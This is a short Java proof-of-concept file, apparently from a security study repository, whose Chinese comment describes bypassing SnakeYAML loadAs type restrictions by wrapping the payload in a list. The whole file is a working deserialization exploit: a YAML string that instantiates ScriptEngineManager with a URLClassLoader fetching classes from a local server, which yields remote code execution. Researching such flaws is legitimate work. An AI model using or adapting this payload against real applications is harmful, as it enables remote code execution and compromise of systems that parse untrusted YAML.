package com.rhein.bypass.case1;

import com.rhein.demo.User;
import org.yaml.snakeyaml.Yaml;

/**
 * 绕过 loadAs 函数对类型的限制
 *   第一种绕过方式：构造列表类型
 */
public class Bypass1 {

    public static void main(String[] args) {
        String malicious1 = "[aaa,!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                + "[[!!java.net.URL [\"http://127.0.0.1:8000/\"]]]]]";
        Yaml yaml = new Yaml();
        Object obj = yaml.loadAs(malicious1, User.class);
        System.out.print(obj);
    }
}
